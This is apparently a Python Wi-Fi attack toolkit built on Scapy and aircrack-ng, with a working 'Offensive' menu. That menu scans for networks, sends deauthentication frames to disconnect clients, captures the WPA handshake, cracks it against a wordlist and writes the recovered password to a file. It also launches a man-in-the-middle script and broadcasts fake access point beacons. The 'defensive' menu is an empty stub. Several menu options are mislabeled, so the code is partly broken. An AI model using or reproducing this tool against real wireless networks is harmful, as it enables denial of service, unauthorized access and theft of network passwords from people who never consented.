import os
import time
import threading
from scapy.all import *
import audit
import fake_ap
# Monitor mode interface
interface = "wlan1"

# Global variables for selected network and client
selected_ap_mac = None
selected_ap_essid = None
selected_channel = None

# Handshake capture path (saved locally)
handshake_capture_file = "handshake.pcap"
wordlist_path = "wordlist.txt"  # Path to wordlist for cracking

# Dictionary to store discovered networks (BSSID: [ESSID, Channel])
networks = {}
sniffing_thread = None
stop_sniffing = threading.Event()

# Function to scan networks
def scan_networks(timeout=10):
    print("[*] Scanning for available networks...")

    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            essid = pkt[Dot11Elt].info.decode() if pkt[Dot11Elt].info else "Hidden SSID"
            bssid = pkt[Dot11].addr2
            channel = int(ord(pkt[Dot11Elt:3].info)) if pkt[Dot11Elt:3] else 0
            if bssid not in networks:
                networks[bssid] = [essid, channel]
                print(f"[*] Found network: {essid} - {bssid} on channel {channel}")

    # Run sniffing in a thread to avoid blocking the main code
    global sniffing_thread
    stop_sniffing.clear()
    sniffing_thread = threading.Thread(target=sniff, kwargs={
        'iface': interface,
        'prn': packet_handler,
        'timeout': timeout
    })
    sniffing_thread.start()
    sniffing_thread.join()  # Wait for sniffing to complete
    print("[*] Scanning complete.")

# Function to select a network
def select_network():
    if not networks:
        print("[-] No networks found. Run a scan first (Option 1).")
        return False

    print("\n[*] Available Networks:")
    for idx, (bssid, details) in enumerate(networks.items(), start=1):
        essid, channel = details
        print(f"{idx}. {essid} ({bssid}) on channel {channel}")

    try:
        choice = int(input("Select a network (1-{}): ".format(len(networks))))
        selected_bssid = list(networks.keys())[choice - 1]
        selected_essid, channel = networks[selected_bssid]

        global selected_ap_mac, selected_ap_essid, selected_channel
        selected_ap_mac = selected_bssid
        selected_ap_essid = selected_essid
        selected_channel = channel
        print(f"[*] Selected {selected_ap_essid} ({selected_ap_mac}) on channel {selected_channel}.")
        return True
    except (ValueError, IndexError):
        print("[-] Invalid selection.")
        return False

# Function to send deauthentication frames
def send_deauth_frames(ap_mac, client_mac="FF:FF:FF:FF:FF:FF", count=100):
    print(f"[*] Sending deauth frames to {ap_mac} targeting {client_mac}...")
    dot11 = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    for _ in range(count):
        sendp(packet, iface=interface, inter=0.1, verbose=False)
    print(f"[*] Sent {count} deauth frames.")

# Function to capture WPA handshake using airodump-ng
def capture_handshake():
    if not selected_ap_mac:
        print("[-] No network selected. Please select one first.")
        return

    print(f"[*] Listening for WPA handshake on channel {selected_channel}...")
    os.system(f"airodump-ng -w handshake --bssid {selected_ap_mac} --channel {selected_channel} {interface} &")
    time.sleep(10)  # Capture for 10 seconds
    os.system("pkill airodump-ng")
    print(f"[*] Handshake saved as handshake-01.cap.")

# Function to check for a valid handshake
def check_handshake():
    print("[*] Checking for handshake...")
    result = os.system(f"aircrack-ng handshake-01.cap")
    if result == 0:
        print("[+] Handshake captured successfully!")
        return True
    else:
        print("[-] No handshake detected.")
        return False

# Updated function to crack handshake and handle file management
def crack_handshake():
    print("[*] Cracking handshake using aircrack-ng...")
    
    # Run aircrack-ng and capture its output
    result = os.popen(f"aircrack-ng handshake-01.cap -w {wordlist_path}").read()
    
    # Check if a password was found
    if "KEY FOUND!" in result:
        # Extract the password from the output
        password_line = [line for line in result.split("\n") if "KEY FOUND!" in line][0]
        password = password_line.split("[")[1].split("]")[0]
        
        # Save the password to passwd.txt
        with open("passwd.txt", "w") as f:
            f.write(f"ESSID: {selected_ap_essid}\n")
            f.write(f"BSSID: {selected_ap_mac}\n")
            f.write(f"Password: {password}\n")
        
        print(f"[+] Password found: {password}")
        print("[*] Saved password to passwd.txt")
        
        # Delete the captured handshake file
        os.remove("handshake-01.cap")
        print("[*] Deleted handshake file.")
    else:
        print("[-] Password not found in the provided wordlist.")

# Function to perform MITM attack
def mitm_attack():
    ip_range = input("Enter the IP range for MITM attack (e.g., 10.0.0.0/24): ")
    command = f"sudo python3 mitm.py -ip_range {ip_range}"
    print(f"[*] Running MITM attack on {ip_range}...")
    os.system(command)

# Function to create fake APs
def create_fake_ap(essid, channel):
    beacon = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")
    beacon /= Dot11Beacon(cap="ESS+privacy")
    beacon /= Dot11Elt(ID="SSID", info=essid)
    beacon /= Dot11Elt(ID="DSset", info=chr(channel).encode())

    sendp(RadioTap()/beacon, iface=interface, inter=0.1, verbose=False)

def create_fake_aps():
    num_aps = int(input("Enter the number of fake APs to create: "))
    for i in range(num_aps):
        essid = input(f"Enter SSID for fake AP {i+1}: ")
        channel = int(input(f"Enter channel (1-13) for fake AP {i+1}: "))
        print(f"[*] Creating fake AP: {essid} on channel {channel}")
        create_fake_ap(essid, channel)
    print("[*] Fake APs created.")

# Offensive menu
def offensive_menu():
    while True:
        print("Offensive Options:")
        print("1. Scan Networks")
        print("2. Deauth and Capture Handshake")
        print("3. Crack Handshake")
        print("4. MITM Attack")
        print("5. Create Fake APs")
        print("6. Exit")

        choice = input("Select an option (1-6): ")
        if choice == '1':
            scan_networks()
        elif choice == '2':
            if select_network():
                send_deauth_frames(selected_ap_mac)
                capture_handshake()
                check_handshake()
        elif choice == '3':
            crack_handshake()
        elif choice == '4':
            mitm_attack()
        elif choice == '5':
            create_fake_aps()
        elif choice == '6':
            audit.audit_networks()
        elif choice == '7':
            fake_ap.create_fake_ap("wlan0mon", "test", 10)
            break
        else:
            print("Invalid choice.")

def defensive_menu():
    while True:
        print("defensive Options:")
        print("1. Detect deauth")
        print("2. Enable Secure AP")
        print("3. detect Arp/DNS spoof")
        print("5. Create Fake APs")



# Main menu
def main_menu():
    while True:
        print("Select Mode:")
        print("1. Offensive")
        print("2. defensive")
        print("3. exit")
    
        mode = input("Enter choice (1/2): ")
    
        if mode == '1':
            offensive_menu()
        elif mode == '2':
            defensive_menu()
        else:
            print("Invalid option.")

if __name__ == "__main__":
    main_menu()

